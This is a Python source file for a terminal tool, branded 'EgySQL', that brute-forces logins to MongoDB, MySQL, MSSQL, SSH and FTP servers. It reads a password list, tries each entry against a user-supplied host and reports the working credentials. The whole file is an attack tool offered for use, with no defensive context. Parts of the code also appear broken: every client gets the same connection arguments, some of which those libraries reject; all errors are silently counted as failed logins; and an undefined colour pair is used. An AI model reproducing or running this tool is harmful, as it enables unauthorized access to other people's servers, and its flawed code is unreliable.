import os
import sys
import socket
import paramiko
import ftplib
import pymongo
import mysql.connector
import pyodbc
import curses

SERVICES = {
    '1': ('MongoDB', pymongo.MongoClient, 27017),
    '2': ('MySQL', mysql.connector.connect, 3306),
    '3': ('MSSQL', pyodbc.connect, 1433),
    '4': ('SQLite', None, 0),  # Placeholder for future implementation
    '5': ('SSH', paramiko.SSHClient, 22),
    '6': ('FTP', ftplib.FTP, 21),
    '7': ('RDP', None, 3389),  # Placeholder for future implementation
}


def check_port_open(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except (socket.timeout, ConnectionRefusedError):
        return False


def read_passwords_from_file(password_list_path):
    try:
        with open(password_list_path) as f:
            return f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] Error: Password list file '{password_list_path}' not found.")
        return None


def execute_bruteforce(service, host, username, password, stdscr):
    try:
        client, client_port = SERVICES[service][1], SERVICES[service][2]
        if client is None:
            raise NotImplementedError(f"{SERVICES[service][0]} bruteforce is not implemented yet.")

        if not check_port_open(host, client_port):
            return False
        
        connection_params = {
            'host': host,
            'port': client_port,
            'username': username,
            'password': password,
            'timeout': 2
        }
        with client(**connection_params) as conn:
            if service == '1':  # MongoDB
                databases = conn.list_database_names()
            elif service == '2':  # MySQL
                cursor = conn.cursor()
                cursor.execute("SHOW DATABASES")
                databases = cursor.fetchall()
                cursor.close()
            elif service == '3':  # MSSQL
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM master.dbo.sysdatabases")
                databases = cursor.fetchall()
                cursor.close()
            return True
    except paramiko.ssh_exception.NoValidConnectionsError:
        return False  # SSH - Failed to connect to the target
    except paramiko.AuthenticationException:
        return False  # SSH - Authentication failure
    except paramiko.ssh_exception.SSHException:
        return False  # SSH - Connection error
    except Exception as e:
        return False  # Other exceptions, indicating a failed login attempt


def bruteforce_service(service, host, username, password_list_path, stdscr, verbose=True):
    passwords = read_passwords_from_file(password_list_path)

    if passwords is None:
        return

    stdscr.clear()
    stdscr.addstr(0, 0, f"[*] Starting {SERVICES[service][0]} bruteforce for {username}@{host}...", curses.color_pair(2))
    stdscr.refresh()

    if not check_port_open(host, SERVICES[service][2]):
        stdscr.addstr(2, 0, f"[-] Failed to connect to {host}:{SERVICES[service][2]}. Make sure the service is running.", curses.color_pair(1))
        stdscr.refresh()
        stdscr.getch()
        stdscr.clear()
        return

    for password in passwords:
        success = execute_bruteforce(service, host, username, password, stdscr)
        if success:
            stdscr.addstr(2, 0, f"[+] Successfully logged in with credentials: {username}:{password}", curses.color_pair(2))
            stdscr.refresh()
            break
        elif verbose:
            stdscr.addstr(2, 0, f"[-] Login failed with credentials: {username}:{password}", curses.color_pair(1))
            stdscr.refresh()

    else:
        stdscr.addstr(2, 0, "[!] Brute force attempt unsuccessful. Password not found.", curses.color_pair(1))
        stdscr.refresh()

    if verbose:
        stdscr.getch()
    stdscr.clear()


def display_message_with_delay(stdscr, message, x, y, color_pair_id, delay=1):
    stdscr.addstr(x, y, message, curses.color_pair(color_pair_id))
    stdscr.refresh()
    stdscr.getch()
    stdscr.clear()


def welcome_message(stdscr):
    stdscr.addstr(0, 0, "Welcome to EgySQL - The Ultimate Multi-Service Brute Force Tool\nAliElTop 1.0", curses.color_pair(3))
    stdscr.refresh()


def main(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_YELLOW, curses.COLOR_BLACK)

    EGY_SQL_LOGO = r"""
    ________████████████_____█████████████
    ______███████████████___███████████████
    ____████████████████████████████████████
    ___█████████████████████████████████████
    __███████████████████████████████████████
    _█████████████████████████████████████████
    _██████████████████████████████████████████
    _███████████████████████████████████████████
    ████████████████████████████████████████████
    █████████████____█████████████_____█████████
    ██████████______███████████______███████████
    _████████_________████████_________████████
    __████████_________███████_________████████
    ___████████_________█████_________████████
    ____████████_________███_________████████
    ____████████████████████████████████████
    _____█████████████████████████████████
    ______███████████████████████████████
    _______█████████████████████████████
    ________██████______________███████
    _________█████______________█████
    __________████______________████
    ___________███______________███
    ____________██______________██
    _____________█______________█
    _____________________________
    """

    welcome_message(stdscr)

    while True:
        stdscr.clear()
        stdscr.addstr(0, 0, "Choose a service to bruteforce:", curses.color_pair(4))
        stdscr.addstr(1, 0, "1. MongoDB", curses.color_pair(3))
        stdscr.addstr(2, 0, "2. MySQL", curses.color_pair(3))
        stdscr.addstr(3, 0, "3. MSSQL", curses.color_pair(3))
        stdscr.addstr(4, 0, "4. SQLite", curses.color_pair(3))
        stdscr.addstr(5, 0, "5. SSH", curses.color_pair(3))
        stdscr.addstr(6, 0, "6. FTP", curses.color_pair(3))
        stdscr.addstr(7, 0, "7. RDP", curses.color_pair(3))
        stdscr.addstr(8, 0, "Q. Quit", curses.color_pair(3))
        stdscr.addstr(EGY_SQL_LOGO, curses.color_pair(2))
        stdscr.refresh()

        choice = stdscr.getch()
        if choice == ord('q') or choice == ord('Q'):
            display_message_with_delay(stdscr, "Exiting...", 1, 20, 5, delay=2)
            sys.exit()

        choice = chr(choice)
        if choice in SERVICES:
            stdscr.clear()
            service_name = SERVICES[choice][0]
            stdscr.addstr(0, 0, f"You chose {service_name}.", curses.color_pair(3))
            stdscr.refresh()
            stdscr.getch()

            stdscr.clear()
            stdscr.addstr(0, 0, "Enter the target host:", curses.color_pair(4))
            stdscr.refresh()
            host = stdscr.getstr(1, 0).decode('utf-8')

            stdscr.clear()
            stdscr.addstr(0, 0, "Enter the username:", curses.color_pair(4))
            stdscr.refresh()
            username = stdscr.getstr(1, 0).decode('utf-8')

            stdscr.clear()
            stdscr.addstr(0, 0, "Enter the password list file path:", curses.color_pair(4))
            stdscr.refresh()
            password_list_path = stdscr.getstr(1, 0).decode('utf-8')

            stdscr.clear()
            stdscr.addstr(0, 0, "Enable verbose mode? (Y/N):", curses.color_pair(4))
            stdscr.refresh()
            verbose_choice = stdscr.getch()
            verbose = verbose_choice == ord('y') or verbose_choice == ord('Y')

            bruteforce_service(choice, host, username, password_list_path, stdscr, verbose=verbose)

        else:
            display_message_with_delay(stdscr, "Invalid choice. Try again...", 1, 20, 5, delay=2)


if __name__ == "__main__":
    curses.wrapper(main)
